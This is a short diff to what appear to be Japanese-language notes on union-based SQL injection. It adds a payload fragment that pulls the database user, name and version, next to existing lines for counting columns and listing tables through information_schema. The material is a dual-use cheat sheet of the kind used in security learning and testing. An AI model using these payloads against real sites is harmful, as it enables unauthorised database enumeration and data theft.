@@ -1417,6 +1417,8 @@ ex: カラムの数が2つだった場合
 
 union select 1, order by 5 --　　　このorder by 5 を以下でおきかえる。
 
+- username, version, databasename
+concat_ws(char(32,58,32), user(), database(), version()) --
 
 ・ show all tables
 group_concat(table_name,0x0a) from information_schema.tables where table_schema=database()
